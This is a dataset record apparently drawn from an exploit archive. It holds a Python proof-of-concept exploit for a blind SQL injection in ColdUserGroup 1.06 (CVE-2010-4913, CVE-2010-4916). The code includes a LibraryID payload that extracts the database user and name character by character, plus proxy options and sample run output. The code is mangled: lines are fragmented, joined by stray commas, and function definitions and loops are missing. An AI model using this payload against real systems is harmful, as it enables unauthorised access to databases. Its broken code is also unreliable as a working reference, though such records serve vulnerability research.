{
    "text": "vul_name : ColdUserGroup 1.06 remote blind SQL injection vulnerability ， vul_cve : CVE-2010-4913 , CVE-2010-4916 ， vul_poc :  #  ! /usr/bin/python ，  # ColdGen - coldusergroup v1.06 0day Remote Blind SQL Injection Exploit ，  # Vendor :  ，  # Found by : mr_me ，  # -> ，  # Script provided 'as is' , without any warranty. ，  # Use for educational purposes only. ，  # Do not use this code to do anything illegal !  ，  # -> ，  # The vulnerabilities :  ，  # - Blind SQL Injection in the index.cfm using parameters : ArticleID & LibraryID ，  # - XSS in the search ，  # This tool assumes the target has a MSSQL backend. ，  # ./ColdUsrGrp0day.py -p localhost : 8080 -s \"Author : \" -t localhost : 8500 -d /coldusrgrp/ ，  #  | -= ColdUserGroup v1.6 0day Remote Blind SQL Injection Exploit =- |  ，  #  | - [ by mr_me - net-ninja.net ] - |  ，  #  ( + ) Exploiting target @  :  ，  #  ( + ) Using string 'Author : ' for the true page ，  #  ( + ) This will take time , have patience. ，  #  ( + ) Testing Proxy. ，  #  ( + ) Proxy @ localhost : 8080 ，  #  ( + ) Building Handler. ，  #  (  !  ) Getting database user : sa ，  #  (  !  ) Getting database name : coldusergroup ， from optparse import OptionParser ， usage = \"./%prog [ <options> ] -s [ true string ] -t [ target ] -d [ directory ] \" ， usage += \"\\nExample : ./%prog -p localhost : 8080 -s 'Author : ' -t localhost : 8500 -d /coldusrgrp/\" ， parser = OptionParser ( usage=usage )  ， parser.add_option ( \"-p\" , type=\"string\" , action=\"store\" , dest=\"proxy\" ,  ， help=\"HTTP Proxy <server : port>\" )  ， parser.add_option ( \"-t\" , type=\"string\" , action=\"store\" , dest=\"target\" ,  ， help=\"The Target server <server : port>\" )  ， parser.add_option ( \"-d\" , type=\"string\" , action=\"store\" , dest=\"directory\" ,  ， help=\"Directory path to the CMS\" )  ， parser.add_option ( \"-s\" , type=\"string\" , action=\"store\" , dest=\"trueStr\" ,  ， help=\"String that is on the 'true' page\" )  ，  ( options , args ) = parser.parse_args (  )  ， print \"\\n\\t | - | \" ， print \"\\t | -= ColdUserGroup v1.6 0day Remote Blind SQL Injection Exploit =- | \" ， print \"\\t | - [ by mr_me - net-ninja.net ] - | \\n\" ， banner (  )  ， parser.print_help (  )  ， sys.exit ( 1 )  ， options.target = \" + options.target ， proxy = {'http' : \" ， opener = urllib.FancyURLopener ( proxy )  ， print \"\\n ( - ) Proxy Timed Out\" ， sys.exit ( 1 )  ， print \"\\n ( - ) Proxy Failed\" ， sys.exit ( 1 )  ， options.target = setTargetHTTP (  )  ， opener = getProxy (  )  ， check = opener.open ( options.target+options.directory+exploit ) .read (  )  ， check = error.read (  )  ， print \" ( - ) Proxy connection failed\" ， sys.exit ( 1 )  ， check = urllib.urlopen ( options.target+options.directory+exploit ) .read (  )  ， check = error.read (  )  ， print \" ( - ) Target connection failed , check your address\" ， sys.exit ( 1 )  ， basicInfo = {'user' : 'user_name ( 0 ) ' , 'name' : 'db_name ( 0 ) '} ， request = ( \"index.cfm?actcfug=LibraryView&LibraryID=209+AND+ISNULL\" ， \" ( ASCII ( SUBSTRING ( CAST ( SELECT+LOWER ( \"+info+\" ) AS+varchar ( 8000 )  , \"+str ( x ) +\" , 1 )  , 0 ) =\"+str ( i )  ， result = getRequest ( request )  ， x = x+1 ， sys.stdout.write ( chr ( i )  ， getBasicInfo ( info , x )  ， x = 1 ， banner (  )  ， options.target = setTargetHTTP (  )  ， print \" ( + ) Exploiting target @  : %s\" % ( options.target+options.directory )  ， print \" ( + ) Using string '%s' for the true page\" % ( options.trueStr )  ， print \" ( + ) This will take time , have patience.\" ， print \"\\n ( + ) Testing Proxy.\" ， print \" ( + ) Proxy @ %s\" % ( options.proxy )  ， print \" ( + ) Building Handler.\" ， sys.stdout.write ( \"\\n (  !  ) Getting database \" + key + \" : \" )  ， getBasicInfo ( basicInfo [ key ]  , x ) ",
    "time": "2010.09.09"
}